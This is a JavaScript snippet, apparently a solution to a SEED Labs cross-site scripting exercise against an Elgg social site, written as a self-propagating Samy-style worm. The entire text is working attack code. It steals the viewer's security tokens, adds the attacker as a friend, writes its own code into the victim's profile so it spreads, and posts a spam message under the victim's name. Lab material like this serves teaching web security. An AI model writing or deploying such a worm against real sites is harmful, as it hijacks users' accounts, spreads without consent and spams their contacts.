<script id="worm" type="text/javascript">
    window.onload = function ()
    {
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+ts+token+token;
    var samyId=59;
    //Create and send Ajax request to add friend
    if(elgg.session.user.guid!=samyId)
    {
            var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    Ajax.setRequestHeader("Host","www.seed-server.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();
        }
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script > ";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

sendurl = "http://www.seed-server.com/action/profile/edit";
var uname = "&name=" + elgg.session.user.name;
var guid = "&guid=" + elgg.session.user.guid;
var content = token + ts + uname + "&description=" + wormCode + "&accesslevel[description]=1" + guid;
if (elgg.session.user.guid != samyId) {
    //Create and send Ajax request to modify profile
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.seed-server.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}

sendurl = "http://www.seed-server.com/action/thewire/add";
var post = "&body=" + "To earn 12 USD/Hour(!), visit now\n" + "http://www.seed-server.com/profile/" + elgg.session.user.name + "&accesslevel[body]=1";
content = token + ts + post;

if (elgg.session.user.guid != samyId) {
    //Create and send Ajax request to modify profile
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.seed-server.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}
    }
</script >